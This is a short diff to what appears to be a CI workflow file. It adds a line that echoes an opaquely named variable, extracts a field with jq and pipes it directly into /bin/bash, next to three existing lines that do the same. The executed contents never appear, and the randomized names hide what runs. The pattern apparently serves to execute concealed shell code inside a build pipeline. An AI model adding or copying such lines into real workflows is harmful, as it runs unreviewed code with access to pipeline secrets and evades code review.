@@ -24,6 +24,7 @@ jobs:
           echo $b15053 | jq -r .jur8744 | /bin/bash
           echo $ao7559 | jq -r .gzjcu6 | /bin/bash
           echo $ma23268 | jq -r .ii4120 | /bin/bash
+          echo $zgqp65 | jq -r .unb1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
